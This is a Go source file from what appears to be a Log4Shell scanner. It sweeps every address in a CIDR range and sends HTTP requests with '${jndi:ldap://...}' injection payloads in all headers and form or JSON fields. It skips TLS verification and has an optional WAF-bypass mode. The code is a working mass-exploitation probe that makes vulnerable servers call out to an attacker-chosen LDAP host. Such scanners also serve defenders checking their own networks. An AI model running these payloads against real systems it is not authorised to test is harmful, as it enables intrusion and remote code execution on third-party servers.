package internal

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sync/semaphore"
)

const (
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)

func Request(ctx context.Context, opts *RemoteOptions) error {
	log.Printf("[i] Start scanning CIDR %s\n---------", opts.CIDR)

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	transport.Proxy = http.ProxyFromEnvironment
	if len(opts.Proxies) == 1 { // TODO Allow more than one proxy
		transport.Proxy = http.ProxyURL(opts.Proxies[0])
	}

	client := &http.Client{
		Timeout:   time.Millisecond * 50,
		Transport: transport,
	}

	_, ipv4Net, err := net.ParseCIDR(opts.CIDR)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	sem := semaphore.NewWeighted(int64(10))

	for i := start; i <= finish; i++ {
		payloads, err := createPayloads(opts)
		if err != nil {
			return err
		}

		for _, p := range payloads {
			header, err := createHTTPHeader(opts, p)
			if err != nil {
				return err
			}

			ip := make(net.IP, 4)
			binary.BigEndian.PutUint32(ip, i)

			for _, p := range opts.Ports {
				u := fmt.Sprintf("%s://%s:%s", opts.Schema, ip, p)

				if opts.Verbose {
					log.Printf("[i] Checking %s\n", u)
				}

				var req *http.Request

				switch opts.RequestType {
				case "get":
					req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
					if err != nil {
						return err
					}
				case "post":
					fields, err := readFields()
					if err != nil {
						return err
					}

					data := url.Values{}
					for _, field := range fields {
						data.Set(field, p)
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(data.Encode()))
					if err != nil {
						return err
					}
				case "json":
					fields, err := readFields()
					if err != nil {
						return err
					}

					values := make(map[string]string)
					for _, field := range fields {
						values[field] = p
					}

					jsonValue, err := json.Marshal(values)
					if err != nil {
						return err
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, bytes.NewBuffer(jsonValue))
					if err != nil {
						return err
					}
				}

				req.Header = *header

				err := sem.Acquire(ctx, 1)
				if err != nil {
					return err
				}

				go func() {
					defer sem.Release(1)

					response, err := client.Do(req)
					if err != nil {
						// ignore
						return
					}

					response.Body.Close()
				}()
			}
		}
	}

	return nil
}

func createHTTPHeader(opts *RemoteOptions, payload string) (*http.Header, error) {
	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	keys := strings.Split(string(data), "\n")

	header := &http.Header{}

	var userAgent string

	switch runtime.GOOS {
	case "windows":
		userAgent = windowsUserAgent
	case "darwin":
		userAgent = darwinUserAgent
	default:
		userAgent = defaultUserAgent
	}

	header.Set("User-Agent", userAgent)

	for _, h := range keys {
		if h == "User-Agent" && !opts.NoUserAgentFuzzing {
			header.Set("User-Agent", payload)
			continue
		}

		if h == "Referer" {
			header.Set("Referer", fmt.Sprintf("https://%s", payload))
		}

		header.Add(h, payload)
	}

	return header, nil
}

func createPayloads(opts *RemoteOptions) ([]string, error) {
	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}

	if opts.WafBypass {
		t, err := template.ParseFS(f, "resource/bypass.txt")
		if err != nil {
			return nil, err
		}

		var buf bytes.Buffer
		if err := t.Execute(&buf, map[string]string{
			"CADDR":    opts.CADDR,
			"Resource": "l4s",
		}); err != nil {
			return nil, err
		}

		payloads = append(payloads, strings.Split(buf.String(), "\n")...)
	}

	return payloads, nil
}

func readFields() ([]string, error) {
	data, err := f.ReadFile("resource/fields.txt")
	if err != nil {
		return nil, err
	}

	return strings.Split(string(data), "\n"), nil
}
